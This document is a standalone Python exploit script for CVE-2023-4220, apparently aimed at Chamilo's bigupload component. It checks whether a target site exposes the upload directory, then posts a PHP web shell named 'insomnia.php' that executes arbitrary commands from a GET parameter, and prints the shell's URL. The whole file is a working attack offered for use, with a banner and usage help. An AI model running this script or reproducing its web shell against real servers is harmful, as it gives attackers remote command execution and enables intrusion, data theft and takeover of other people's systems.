#!/usr/bin/python3
# CVE-2023-4220
# Autor: Insomnia (Jacob S.)
# IG: insomnia.py
# X: @insomniadev_
# Yt: insomnia-dev

import sys
import requests
import time
from os import system
import io

# Colors
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
yellow = '\033[93m'
reset = '\033[0m'

def banner():
    textBanner = rf"""
 / __)/ )( \(  __)___(___ \ /  \(___ \( __ \ ___  / _ \(___ \(___ \ /  \ 
( (__ \ \/ / ) _)(___)/ __/(  0 )/ __/ (__ ((___)(__  ( / __/ / __/(  0 )
 \___) \__/ (____)   (____) \__/(____)(____/       (__/(____)(____) \__/ 
"""
    print(green,textBanner)
    print(yellow,'                                                                            by Insomnia (Jacob S.)')


def help():
    print (red,'[!]Use:', reset)
    print(f'          {sys.argv[0]} domain')
    print(red,'[!]Example:', reset)
    print(f'          {sys.argv[0]} http://example.com')
    print(red,'[!]Important:', reset)
    print(f"          Make sure that the URL doesn't have redirects!") 

def target(url):
    print(blue ,f'             URL: {url}')
    time.sleep(3)
    system("clear")


def check_url_exists(url):
    print(blue,'\n\n[+]', reset, 'Checking if it is vulnerable.')
    
    try:
        response = requests.head(url + '/main/inc/lib/javascript/bigupload/files', allow_redirects=True)
        if response.status_code == 200:
            is_vuln()
            
            try:

                response2 = requests.head(url + '/main/inc/lib/javascript/bigupload/files/insomnia.php', allow_redirects=True)
                if response2.status_code == 200:
                    print(f'Success! open in browser: {url}/main/inc/lib/javascript/bigupload/files/insomnia.php')
                else:
                    upload_file(sys.argv[1])
            except requests.RequestException as e:
                print(red,f"[x] Error checking the URL: {e}")
                return False


        else:
            print(f'Error {url}')
    except requests.RequestException as e:
        print(red,f"[x] Error checking the URL: {e}")
        return False


def upload_file(url):
    new_url = url + '/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    insomnia_php = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
"""
    file_like_object = io.BytesIO(insomnia_php.encode('utf-8'))
    file_like_object.name = 'insomnia.php'  
    files = {'bigUploadFile': file_like_object}
    response3 = requests.post(new_url, files=files)
    print(response3.status_code)
    print(f'Success! open in browser: {url}/main/inc/lib/javascript/bigupload/files/insomnia.php')




def is_vuln():
    print(red,'''
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██     [*] "It is vulnerable!"
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██     [*] "It is vulnerable!"
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██     [*] "It is vulnerable!"
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████     [*] "It is vulnerable!"
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
''', reset)

def main():
    banner()
    target(sys.argv[1])
    check_url_exists(sys.argv[1])



if __name__ == "__main__":
    system("clear")
    if len(sys.argv) == 2:
        main()
    else:
        banner()
        help()
